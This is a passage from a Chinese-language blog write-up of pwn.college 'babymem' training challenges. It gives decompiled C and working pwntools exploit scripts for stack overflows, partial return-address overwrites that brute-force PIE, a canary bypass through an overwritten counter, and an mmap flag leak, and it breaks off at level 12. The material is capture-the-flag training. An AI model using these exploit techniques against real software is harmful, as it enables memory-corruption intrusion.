class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>

<h1 id="7-1"><a href="#7-1" class="headerlink" title="7-1"></a>7-1</h1><p>略</p>
<h1 id="8-0"><a href="#8-0" class="headerlink" title="8-0"></a>8-0</h1><p>题目先读取字节数，然后将这么多字节读取到buf，也就是堆上面</p>
<p>然后使用 memcpy 将堆上 buf 的内容复制到栈上面</p>
<p>思路：先绕过 strlen 的检查，再构造 payload 冲掉返回地址最后两个字节，需要爆破返回地址最后两个字节来对抗 pie</p>
<p>注意⚠️：如果 <code>size</code> 大于 <code>buf</code> 的实际大小，<code>memcpy</code> 会尝试从堆上 <code>buf</code> 后面的内存读取数据，冲掉正确的返回地址（注意到这里只覆盖两个字节）， 因此payload 的内容和前面读取的这个 size 一定要准确匹配上</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level8.0&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;100&#x27;</span>)<br><br>    <span class="hljs-comment">#payload = b&#x27;a&#x27; * 120 + b&#x27;\x56&#x27;+b&#x27;\x22&#x27; </span><br>    payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">71</span> + p32(<span class="hljs-number">0x1B6A</span>)<br>    <span class="hljs-comment">#p.recvline(&#x27;Send your payload&#x27;)</span><br>    p.sendline(payload)<br><br>    <span class="hljs-comment">#p.interactive()</span><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<h1 id="8-1"><a href="#8-1" class="headerlink" title="8-1"></a>8-1</h1><p>略</p>
<h1 id="9-0"><a href="#9-0" class="headerlink" title="9-0"></a>9-0</h1><p>上难度了，有 Canary，有 pie，有一段神奇的每次只 read 1 字节的逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 9-1.c</span><br><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-58h] BYREF</span><br>  __int64 *v5; <span class="hljs-comment">// [rsp+30h] [rbp-50h]</span><br>  <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// [rsp+38h] [rbp-48h]</span><br>  __int64 v7[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-40h] BYREF</span><br>  __int64 v8[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+70h] [rbp-10h] BYREF 这里</span><br><br>  v8[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">memset</span>(v7, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v7));<br>  v8[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>; <span class="hljs-comment">//这里</span><br>  v5 = v7;<span class="hljs-comment">// 缓冲区起始处</span><br>  v6 = (<span class="hljs-keyword">int</span> *)v8 + <span class="hljs-number">1</span>; <span class="hljs-comment">// 这里</span><br>  v4 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;v4);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, v4);<br>  <span class="hljs-keyword">while</span> ( *v6 &lt; v4 )<br>  &#123;<br>    v0 = read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">char</span> *)v5 + *v6, <span class="hljs-number">1uLL</span>);<span class="hljs-comment">//每次往缓冲区偏移*v6大小处写入 1 字节</span><br>    *v6 += v0;<span class="hljs-comment">// *v6 自加 1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *v6 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v1 = __errno_location();<br>    v2 = strerror(*v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>思路如下 </p>
<p>Canary 绕过</p>
<ul>
<li>缓冲区溢出到 n，覆盖 n，将其改写为缓冲区距离返回地址的偏移-1</li>
</ul>
<p>pie</p>
<ul>
<li>同 level 8 爆破</li>
</ul>
<p>偏移</p>
<ul>
<li>缓冲区起始处为rbp-0x40，Canary 为 rbp-0x8，n 值位于rbp-0x8-0x4<ul>
<li>仔细分析一下 v8 和 v6<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level9.0&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    <br>    <span class="hljs-comment"># 128+8+2=138</span><br>    p.sendline(<span class="hljs-string">b&#x27;138&#x27;</span>) <br>    <span class="hljs-comment"># 136=\x88 注意不能是0x88（为什么？)这里也可以使用 p8</span><br>    payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">116</span>+<span class="hljs-string">b&#x27;\x87&#x27;</span>+p16(<span class="hljs-number">0x1a17</span>)<br><br>    p.sendline(payload)<br><br>    <span class="hljs-built_in">str</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>.find(<span class="hljs-string">b&#x27;pwn.college&#123;&#x27;</span>) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="9-1"><a href="#9-1" class="headerlink" title="9-1"></a>9-1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> True:<br>    p = process(<span class="hljs-string">&#x27;/challenge/babymem_level9.1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Payload size:&#x27;</span>)<br>    # <span class="hljs-number">64</span>+<span class="hljs-number">8</span>+<span class="hljs-number">2</span><br>    p.sendline(b<span class="hljs-number">&#x27;74&#x27;</span>) <span class="hljs-meta"># easy <span class="hljs-meta-keyword">error</span> </span><br><br>    payload = b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span> * <span class="hljs-number">52</span>  # <span class="hljs-number">52</span> = <span class="hljs-number">0x40</span><span class="hljs-number">-0x8</span><span class="hljs-number">-0x4</span><br>    payload += p8(<span class="hljs-number">0x47</span>) # 注意这里是缓冲区偏移+<span class="hljs-number">8</span><span class="hljs-number">-1</span><br>    payload += p16(<span class="hljs-number">0x1F6E</span>)<br>    <br>    p.sendline(payload)<br><br>    str = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> str.find(b<span class="hljs-number">&#x27;</span>pwn.college&#123;<span class="hljs-string">&#x27;) != -1:</span><br><span class="hljs-string">        print(str)</span><br><span class="hljs-string">        break</span><br></code></pre></td></tr></table></figure>

<h1 id="10-0"><a href="#10-0" class="headerlink" title="10-0"></a>10-0</h1><p>没有 win 函数， flag 被注入内存，启用了 pie 和 Canary</p>
<p>打印的缓冲区和 flag 位置较近，可以通过题目本身逻辑中的 print 函数打印出 flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level10.0&#x27;</span>)<br><br><span class="hljs-comment"># 准备有效载荷</span><br>buffer_size = <span class="hljs-number">31</span><br>p.sendline(<span class="hljs-string">b&#x27;31&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br><br> <br>p.sendline(payload)<br><br><span class="hljs-comment"># 与进程进行交互，以查看输出或调试</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="10-1"><a href="#10-1" class="headerlink" title="10-1"></a>10-1</h1><p>略</p>
<h1 id="11-0"><a href="#11-0" class="headerlink" title="11-0"></a>11-0</h1><p>按理来说mmap 分配的地址应该不是不连续的</p>
<p>但是根据输出发现分配页面的地址是连续的</p>
<blockquote>
<p>buf 的地址在 flag 地址后面73+0x4000 的地方吗？这里 mmap 的内存分配，分配的空间是紧邻的吗？</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-30h]</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+24h] [rbp-2Ch]</span><br>  <span class="hljs-keyword">size_t</span> nbytes; <span class="hljs-comment">// [rsp+28h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> *v7; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br>  <span class="hljs-keyword">void</span> *v8; <span class="hljs-comment">// [rsp+38h] [rbp-18h]</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">void</span> *v10; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  nbytes = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The challenge() function has just been launched!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This challenge stores your input buffer in an mmapped page of memory!&quot;</span>);<br>  v7 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n&quot;</span>, v7);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;In this level, the flag will be loaded into memory.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;However, at no point will this program actually print the buffer storing the flag.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Memory mapping the flag...&quot;</span>);<br>  v0 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  v8 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, v0, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 0x1000, 4, MAP_SHARED, open(\&quot;/flag\&quot;, 0), 0) = %p\n&quot;</span>, v8);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">2</span>; ++i )<br>  &#123;<br>    v10 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n&quot;</span>, v10);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Memory mapping the input buffer...&quot;</span>);<br>  buf = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x49</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Called mmap(0, 73, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, &amp;nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You have chosen to send %lu bytes of input!\n&quot;</span>, nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This will allow you to write from %p (the start of the input buffer)\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<br>    <span class="hljs-string">&quot;right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n&quot;</span>,<br>    (<span class="hljs-keyword">char</span> *)buf + nbytes,<br>    nbytes - <span class="hljs-number">73</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, nbytes);<br>  v5 = read(<span class="hljs-number">0</span>, buf, nbytes);<br>  <span class="hljs-keyword">if</span> ( v5 &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v1 = __errno_location();<br>    v2 = strerror(*v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You sent %d bytes!\n&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v5);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The program&#x27;s memory status:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the input buffer starts at %p\n&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;- the address of the flag is %p.\n&quot;</span>, v8);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br><br><br><br><span class="hljs-function">The <span class="hljs-title">challenge</span><span class="hljs-params">()</span> function has just been launched!</span><br><span class="hljs-function">This challenge stores your input buffer in an mmapped page of memory!</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d4a000</span><br>In <span class="hljs-keyword">this</span> level, the flag will be loaded into memory.<br>However, at no point will <span class="hljs-keyword">this</span> program actually print the buffer storing the flag.<br>Memory mapping the flag...<br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">4</span>, MAP_SHARED, open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>), <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1d000</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1c000</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1b000</span><br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d1a000</span><br>Memory mapping the input buffer...<br><span class="hljs-function">Called <span class="hljs-title">mmap</span><span class="hljs-params">(<span class="hljs-number">0</span>, <span class="hljs-number">73</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)</span> </span>= <span class="hljs-number">0x7f4208d19000</span><br>Payload size: You have chosen to send <span class="hljs-number">16384</span> bytes of input!<br>This will allow you to write from <span class="hljs-number">0x7f4208d19000</span> (the start of the input buffer)<br><span class="hljs-function">right up <span class="hljs-title">to</span> <span class="hljs-params">(but <span class="hljs-keyword">not</span> including)</span> 0<span class="hljs-title">x7f4208d1d000</span> <span class="hljs-params">(which is <span class="hljs-number">16311</span> bytes beyond the end of the buffer)</span>.</span><br><span class="hljs-function">Send your <span class="hljs-title">payload</span> <span class="hljs-params">(up to <span class="hljs-number">16384</span> bytes)</span>!</span><br><span class="hljs-function">You sent 16384 bytes!</span><br><span class="hljs-function">The program&#x27;s memory status:</span><br><span class="hljs-function">- the input buffer starts at 0x7f4208d19000</span><br><span class="hljs-function">- the address of the flag is 0x7f4208d1d000.</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br> <br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br> <br>p = process(<span class="hljs-string">&#x27;/challenge/babymem_level11.0&#x27;</span>)<br><br><span class="hljs-comment"># 准备有效载荷</span><br>buffer_size = <span class="hljs-number">16384</span><br>p.sendline(<span class="hljs-string">b&#x27;16384&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * buffer_size<br><br> <br>p.sendline(payload)<br><br><span class="hljs-comment"># 与进程进行交互，以查看输出或调试</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h1 id="11-1"><a href="#11-1" class="headerlink" title="11-1"></a>11-1</h1><p>0x4000</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 <span class="hljs-title">challenge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">int</span> *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-30h]</span><br>  <span class="hljs-keyword">size_t</span> nbytes[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+28h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">void</span> *buf; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">void</span> *v7; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  nbytes[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  nbytes[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">size_t</span>)mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  v0 = open(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-number">0</span>);<br>  nbytes[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">size_t</span>)mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, v0, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; ++i )<br>    v7 = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  buf = mmap(<span class="hljs-number">0LL</span>, <span class="hljs-number">0x54</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Payload size: &quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%lu&quot;</span>, nbytes);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Send your payload (up to %lu bytes)!\n&quot;</span>, nbytes[<span class="hljs-number">0</span>]);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)read(<span class="hljs-number">0</span>, buf, nbytes[<span class="hljs-number">0</span>]) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    v1 = __errno_location();<br>    v2 = strerror(*v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ERROR: Failed to read input -- %s!\n&quot;</span>, v2);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You said: %s\n&quot;</span>, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>


<h1 id="12-0"><a href="#12-0" class="headerlink" title="12-0"></a>12-0</h1><p>开了 pie，Canary</p>
<ul>
<li>程序有后门，可以二次调用 challenge</li>
